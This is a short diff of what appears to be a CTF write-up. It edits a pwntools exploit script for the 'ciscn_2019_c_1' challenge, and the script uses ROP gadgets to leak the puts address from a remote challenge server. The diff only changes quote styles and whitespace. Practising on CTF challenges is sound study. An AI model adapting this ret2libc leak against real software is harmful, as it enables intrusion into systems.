@@ -89,12 +89,13 @@
 
 ```python
 from pwn import *
+
 r=remote("4c9dc9ac.tcp-ctf2.dasctf.com", 9999, ssl=True)
 elf=ELF("./ciscn_2019_c_1")
 
 pop_rdi_addr=0x400c83
-put_got=elf.got['puts']
-put_plt=elf.plt['puts']
+put_got=elf.got["puts"]
+put_plt=elf.plt["puts"]
 encrypt_addr=0x4009A0
 
 r.sendlineafter("Input your choice!",str(1))
@@ -105,7 +106,7 @@ r.recvline()
 r.recvline()
 r.recvline()
 r.recvline()
-puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\x00'))
+puts_addr=u64(r.recvuntil("\n")[:-1].ljust(8,b"\x00"))
 print(hex(puts_addr))
 
 r.interactive()
